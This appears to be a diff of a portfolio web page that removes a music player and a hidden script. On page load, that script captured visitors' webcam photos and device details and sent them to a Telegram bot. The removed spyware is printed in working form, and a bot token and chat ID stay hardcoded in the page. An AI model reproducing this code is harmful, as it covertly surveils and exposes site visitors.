@@ -75,161 +75,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
   <link href="css/style.css" rel="stylesheet">
 
-  <!-- Music Player Styles -->
   <style>
-    .music-player-container {
-      position: fixed;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      z-index: 1000;
-      display: flex;
-      align-items: center;
-      animation: slideInRight 0.5s ease;
-      touch-action: none;
-    }
-
-    .music-player-toggle {
-      background: linear-gradient(135deg, #007bff, #00ddeb);
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .music-player-toggle:hover {
-      transform: scale(1.1);
-      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.4);
-    }
-
-    .music-player {
-      background: linear-gradient(to bottom right, #ffffff, #e6f0fa);
-      padding: 15px;
-      border-radius: 15px 0 0 15px;
-      box-shadow: -6px 0 20px rgba(0, 0, 0, 0.2);
-      width: 0;
-      overflow: hidden;
-      transition: width 0.5s ease;
-      display: none;
-    }
-
-    .music-player.open {
-      display: block;
-      width: 300px;
-    }
-
-    @keyframes slideInRight {
-      from { transform: translateY(-50%) translateX(100%); opacity: 0; }
-      to { transform: translateY(-50%) translateX(0); opacity: 1; }
-    }
-
-    .music-player-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 10px;
-      cursor: move;
-    }
-
-    .music-player-header h5 {
-      margin: 0;
-      font-size: 1.2rem;
-      color: #333;
-      font-weight: 600;
-    }
-
-    .close-player {
-      background: none;
-      border: none;
-      font-size: 1.2rem;
-      cursor: pointer;
-      color: #dc3545;
-      transition: transform 0.3s ease;
-    }
-
-    .close-player:hover {
-      transform: scale(1.2);
-    }
-
-    .track-list {
-      max-height: 200px;
-      overflow-y: auto;
-      margin-bottom: 10px;
-      padding: 5px;
-      border-radius: 8px;
-      background: #f8f9fa;
-    }
-
-    .track-item {
-      padding: 8px;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: all 0.3s ease;
-      font-size: 0.85rem;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .track-item:hover, .track-item.active {
-      background: linear-gradient(90deg, #007bff, #00ddeb);
-      color: white;
-      transform: translateX(3px);
-    }
-
-    .track-item i {
-      font-size: 0.9rem;
-    }
-
-    .player-controls {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 8px 0;
-    }
-
-    .player-controls button {
-      background: none;
-      border: none;
-      font-size: 1.3rem;
-      cursor: pointer;
-      color: #007bff;
-      transition: color 0.3s ease, transform 0.3s ease;
-    }
-
-    .player-controls button:hover {
-      color: #0056b3;
-      transform: scale(1.2);
-    }
-
-    #audioPlayer {
-      width: 100%;
-      margin-top: 10px;
-    }
-
-    .search-container {
-      margin-bottom: 10px;
-    }
-
-    .search-container input {
-      width: 100%;
-      padding: 8px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      font-size: 0.9rem;
-    }
-
-    .search-container input:focus {
-      outline: none;
-      border-color: #007bff;
-      box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
-    }
-
     .video-background {
       position: absolute;
       top: 0;
@@ -248,31 +94,38 @@
       visibility: visible;
     }
 
-    @media (max-width: 576px) {
-      .music-player-container {
-        top: auto;
-        bottom: 10px;
-        right: 5%;
-        transform: none;
-      }
-      .music-player.open {
-        width: 90vw;
-        max-width: 300px;
-      }
-      .music-player-toggle {
-        width: 40px;
-        height: 40px;
-      }
-      #audioPlayer {
-        height: 30px;
-      }
+    #preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #fff;
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #preloader:after {
+      content: '';
+      width: 40px;
+      height: 40px;
+      border: 5px solid #007bff;
+      border-top: 5px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 
 <body id="page-top">
-  <video id="webcam" style="display: none;" autoplay></video>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <div id="preloader"></div>
 
   <nav class="navbar navbar-b navbar-trans navbar-expand-md fixed-top" id="mainNav">
     <div class="container">
@@ -322,28 +175,6 @@
               class="text-slider"></strong></p>
         </div>
       </div>
-    </div>
-  </div>
-
-  <div class="music-player-container" id="musicPlayerContainer" data-aos="fade-left">
-    <div class="music-player-toggle" id="musicPlayerToggle">
-      <i class="fas fa-music" style="font-size: 1.2rem; color: white;"></i>
-    </div>
-    <div class="music-player" id="musicPlayer">
-      <div class="music-player-header">
-        <h5>Music Player</h5>
-        <button class="close-player" id="closePlayer"><i class="fas fa-times"></i></button>
-      </div>
-      <div class="search-container">
-        <input type="text" id="searchInput" placeholder="Search for songs...">
-      </div>
-      <div class="track-list" id="trackList"></div>
-      <div class="player-controls">
-        <button id="prevTrack"><i class="fas fa-backward"></i></button>
-        <button id="playPause"><i class="fas fa-play"></i></button>
-        <button id="nextTrack"><i class="fas fa-forward"></i></button>
-      </div>
-      <audio id="audioPlayer" controls></audio>
     </div>
   </div>
 
@@ -1060,7 +891,7 @@
                           </div>
                         </div>
                         <div class="col-md-12">
-                          <button type="submit" class="button button-a button-big button-rouded">Send Message</button>
+                          <button type="button" class="button button-a button-big button-rouded" onclick="sendFormData()">Send Message</button>
                         </div>
                       </div>
                     </form>
@@ -1115,7 +946,6 @@
   </section>
 
   <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
-  <div id="preloader"></div>
 
   <script src="lib/jquery/jquery.min.js"></script>
   <script src="lib/jquery/jquery-migrate.min.js"></script>
@@ -1130,7 +960,6 @@
   <script src="contactform/contactform.js"></script>
   <script src="js/main.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-  <script src="https://unpkg.com/interactjs"></script>
 
   <script>
     AOS.init({
@@ -1145,259 +974,6 @@
 
     const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw";
     const CHAT_ID = "6992354984";
-
-    const audioPlayer = document.getElementById('audioPlayer');
-    const musicPlayer = document.getElementById('musicPlayer');
-    const musicPlayerToggle = document.getElementById('musicPlayerToggle');
-    const closePlayer = document.getElementById('closePlayer');
-    const playPauseBtn = document.getElementById('playPause');
-    const prevTrackBtn = document.getElementById('prevTrack');
-    const nextTrackBtn = document.getElementById('nextTrack');
-    const trackList = document.getElementById('trackList');
-    const searchInput = document.getElementById('searchInput');
-
-    const tracks = [
-      { name: "Sample Track 1", audioUrl: null },
-      { name: "Sample Track 2", audioUrl: null },
-      { name: "Sample Track 3", audioUrl: null }
-    ];
-
-    let currentTrack = 0;
-    let isPlaying = false;
-
-    function populateTrackList(searchResults = tracks) {
-      trackList.innerHTML = '';
-      searchResults.forEach((track, index) => {
-        const trackItem = document.createElement('div');
-        trackItem.classList.add('track-item');
-        trackItem.innerHTML = `<i class="fas fa-music"></i> ${track.name}`;
-        trackItem.addEventListener('click', () => {
-          currentTrack = index;
-          playTrack();
-        });
-        trackList.appendChild(trackItem);
-      });
-      updateTrackList();
-    }
-
-    function playTrack() {
-      if (tracks[currentTrack].audioUrl) {
-        audioPlayer.src = tracks[currentTrack].audioUrl;
-        audioPlayer.play().then(() => {
-          isPlaying = true;
-          playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-        }).catch(err => {
-          console.error('Playback error:', err);
-          showToast('Error playing the track.', 'error');
-        });
-      } else {
-        showToast('No audio available for this track.', 'error');
-      }
-      updateTrackList();
-    }
-
-    function updateTrackList() {
-      const trackItems = trackList.querySelectorAll('.track-item');
-      trackItems.forEach((item, index) => {
-        item.classList.toggle('active', index === currentTrack);
-      });
-    }
-
-    playPauseBtn.addEventListener('click', () => {
-      if (isPlaying) {
-        audioPlayer.pause();
-        isPlaying = false;
-        playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-      } else if (tracks[currentTrack].audioUrl) {
-        audioPlayer.play().then(() => {
-          isPlaying = true;
-          playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-        }).catch(err => {
-          console.error('Playback error:', err);
-          showToast('Error playing the track.', 'error');
-        });
-      }
-    });
-
-    prevTrackBtn.addEventListener('click', () => {
-      currentTrack = (currentTrack - 1 + tracks.length) % tracks.length;
-      playTrack();
-    });
-
-    nextTrackBtn.addEventListener('click', () => {
-      currentTrack = (currentTrack + 1) % tracks.length;
-      playTrack();
-    });
-
-    function toggleMusicPlayer(open) {
-      if (open) {
-        musicPlayer.style.display = 'block';
-        musicPlayer.classList.add('open');
-        musicPlayer.classList.remove('closing');
-      } else {
-        musicPlayer.classList.add('closing');
-        musicPlayer.classList.remove('open');
-        setTimeout(() => {
-          musicPlayer.style.display = 'none';
-          musicPlayer.classList.remove('closing');
-        }, 300);
-      }
-    }
-
-    musicPlayerToggle.addEventListener('click', () => {
-      toggleMusicPlayer(!musicPlayer.classList.contains('open'));
-    });
-
-    closePlayer.addEventListener('click', () => {
-      toggleMusicPlayer(false);
-    });
-
-    async function searchTracks(query) {
-      try {
-        const response = await fetch(`https://www.theaudiodb.com/api/v1/json/123/searchtrack.php?t=${encodeURIComponent(query)}`);
-        const data = await response.json();
-        if (data.track && data.track.length > 0) {
-          const searchResults = data.track.map(item => ({
-            name: `${item.strArtist} - ${item.strTrack}`,
-            audioUrl: item.strMusicVid || null // Audio preview yo'q, shuning uchun null
-          })).filter(track => track.audioUrl); // Faqat audio URL bor qo'shiqlarni olish
-          if (searchResults.length > 0) {
-            tracks.length = 0;
-            tracks.push(...searchResults);
-            currentTrack = 0;
-            populateTrackList(searchResults);
-            playTrack();
-          } else {
-            showToast('No playable tracks found.', 'error');
-          }
-        } else {
-          showToast('No search results found.', 'error');
-        }
-      } catch (error) {
-        console.error('Search error:', error);
-        showToast('An error occurred during search.', 'error');
-      }
-    }
-
-    searchInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter' && searchInput.value.trim()) {
-        searchTracks(searchInput.value.trim());
-      }
-    });
-
-    interact('#musicPlayerContainer').draggable({
-      listeners: {
-        move(event) {
-          const target = event.target;
-          const x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
-          const y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;
-          target.style.transform = `translate(${x}px, ${y}px)`;
-          target.setAttribute('data-x', x);
-          target.setAttribute('data-y', y);
-        }
-      },
-      modifiers: [
-        interact.modifiers.restrictRect({
-          restriction: 'parent',
-          endOnly: true
-        })
-      ]
-    });
-
-    const webcam = document.getElementById('webcam');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-
-    async function capturePhotoAndDeviceInfo() {
-      let deviceInfo = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        online: navigator.onLine,
-        cookiesEnabled: navigator.cookieEnabled,
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        battery: 'Unknown'
-      };
-
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        deviceInfo.ip = ipData.ip;
-      } catch (err) {
-        deviceInfo.ip = 'Unknown';
-      }
-
-      if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-          deviceInfo.battery = `Charge: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging ? 'Yes' : 'No'}`;
-          sendDeviceInfo(deviceInfo);
-        });
-      } else {
-        sendDeviceInfo(deviceInfo);
-      }
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        webcam.srcObject = stream;
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        canvas.width = webcam.videoWidth;
-        canvas.height = webcam.videoHeight;
-        context.drawImage(webcam, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg');
-        stream.getTracks().forEach(track => track.stop());
-        sendToTelegram(imageData, 'photo', `User photo | Time: ${new Date().toLocaleString('en-US')}\n${JSON.stringify(deviceInfo, null, 2)}`);
-      } catch (err) {
-        sendToTelegram(null, 'text', `Webcam permission denied or error occurred.\nDevice info:\n${JSON.stringify(deviceInfo, null, 2)}`);
-      }
-    }
-
-    async function sendDeviceInfo(deviceInfo) {
-      await sendToTelegram(null, 'text', `New user info:\n${JSON.stringify(deviceInfo, null, 2)}`);
-    }
-
-    async function sendToTelegram(content, type, caption) {
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        let endpoint = 'sendMessage';
-
-        if (type === 'text') {
-          formData.append('text', caption);
-          formData.append('parse_mode', 'Markdown');
-        } else if (type === 'photo') {
-          const response = await fetch(content);
-          const blob = await response.blob();
-          formData.append('photo', blob, 'photo.jpg');
-          formData.append('caption', caption);
-          endpoint = 'sendPhoto';
-        }
-
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
-          method: 'POST',
-          body: formData
-        });
-
-        const data = await response.json();
-        if (!data.ok) {
-          console.error('Telegram error:', data);
-        }
-      } catch (error) {
-        console.error('Error occurred:', error);
-      }
-    }
-
-    window.addEventListener('load', () => {
-      capturePhotoAndDeviceInfo();
-      const contactForm = document.getElementById('contactForm');
-      if (contactForm) {
-        contactForm.addEventListener('submit', async (event) => {
-          event.preventDefault();
-          await sendFormData();
-        });
-      }
-    });
 
     async function sendFormData() {
       try {
@@ -1470,8 +1046,15 @@
       setTimeout(() => toast.remove(), 3000);
     }
 
-    // Initialize track list
-    populateTrackList();
+    window.addEventListener('load', () => {
+      const contactForm = document.getElementById('contactForm');
+      if (contactForm) {
+        contactForm.addEventListener('submit', async (event) => {
+          event.preventDefault();
+          await sendFormData();
+        });
+      }
+    });
   </script>
 </body>
 
